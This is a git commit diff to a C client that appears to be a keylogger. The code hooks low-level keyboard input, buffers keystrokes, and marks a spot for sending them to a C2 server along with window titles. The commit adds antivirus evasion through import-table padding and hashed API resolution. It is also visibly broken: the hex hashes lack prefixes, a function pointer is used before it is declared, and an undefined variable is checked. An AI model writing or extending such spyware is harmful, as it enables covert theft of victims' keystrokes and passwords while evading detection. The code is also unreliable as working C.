1b53a8570e213dd1b6aee44a43337a55a3c4af95
l00sy4 <142809264+l00sy4@users.noreply.github.com>
2024-02-04 17:24:54 +0200

    Updated client
    Included the FNV hash of user32.dll and GetForegroundWindow.
    
    Replaced GetForegroundWindow with the hashed API as an example, the rest will be completed as needed

--- client.c
+++ client.c
@@ -1,8 +1,13 @@
 #include <Windows.h>
 #include "callback.h"
+#include "IATfuscation.c"
+#include "typedef.h"
+
+#define USER32DllHash 1a58c439
+#define GetForegroundWindowHash 8fe07322
 
 // Initialize a handle to the currently active window 
-HWND CurrentWindow = GetForegroundWindow();
+HWND CurrentWindow = GetForegroundWeendow();
 
 UINT Buffer[1024] = {0};
 SIZE_T Index = 0;
@@ -34,7 +39,7 @@ LRESULT CALLBACK CaptureKeyEvent(int nCode, WPARAM wParam, LPARAM lParam)
             StoreKeyEvent(kbdStruct->vkCode);
         }
 
-        if (GetForegroundWindow() != CurrentWindow)
+        if (GetForegroundWeendow() != CurrentWindow)
         {
             // Send the key event buffer to the C2, along with the previous' window title
         }
@@ -46,6 +51,28 @@ LRESULT CALLBACK CaptureKeyEvent(int nCode, WPARAM wParam, LPARAM lParam)
 
 int main()
 {   
+    // Start by populating the IAT with benign WinAPI functions
+    ObfuscateIAT();
+
+    // Get handle on USER32.DLL
+    HMODULE USER32Handle = GetDllHandle(USER32DllHash);
+    if (USER32Handle == NULL)
+    {
+        return -1;
+    }
+
+    // Get handle on GetForegroundWindow()
+    // Will rename to something like Function1 when all is said and done
+    fnGetForegroundWindow GetForegroundWeendow = (fnGetForegroundWindow)GetFunctionAddress(USER32Handle, GetForegroundWindowHash);
+    if (pMessageBoxA == NULL) 
+    {
+        return -1;
+    }
+
+    //...
+    // Fill out rest of the functions when the client is done
+    //...
+
     HHOOK keyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, CaptureKeyEvent, NULL, 0);
 
     MSG msg;
